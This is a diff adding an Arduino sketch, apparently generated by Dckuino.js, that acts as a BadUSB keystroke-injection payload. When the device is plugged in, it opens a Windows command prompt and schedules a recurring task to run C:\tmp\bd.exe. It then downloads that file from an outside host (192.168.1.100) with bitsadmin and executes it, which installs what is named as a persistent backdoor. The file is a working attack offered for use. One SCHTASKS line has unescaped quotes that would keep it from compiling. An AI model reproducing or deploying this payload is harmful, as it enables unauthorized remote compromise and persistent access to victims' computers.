@@ -1,0 +1,69 @@
+/*
+ * Generated with <3 by Dckuino.js, an open source project !
+ */
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 1000ms
+  delay(1000);
+
+  delay(1000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+
+  delay(1000);
+  Keyboard.print("cmd");
+  typeKey(KEY_RETURN);
+
+
+  delay(1000);
+  Keyboard.print("SCHTASKS /CREATE /SC MINUTE /MO 30 /TN "MyTasks\\Acid" /TR C:\\tmp\\bd.exe");
+  typeKey(KEY_RETURN);
+
+
+  delay(1000);
+  Keyboard.print("md C:\\tmp");
+  typeKey(KEY_RETURN);
+
+
+  delay(1000);
+  Keyboard.print("cd C:\\tmp");
+  typeKey(KEY_RETURN);
+
+
+  delay(1000);
+  Keyboard.print("bitsadmin /transfer debjob /download /priority normal http://192.168.1.100/bd.exe C:\\tmp\\bd.exe");
+  typeKey(KEY_RETURN);
+  
+
+  delay(1000);
+  Keyboard.print("bd.exe");
+  typeKey(KEY_RETURN);
+
+
+  delay(1000);
+  Keyboard.print("exit");
+  typeKey(KEY_RETURN);
+
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
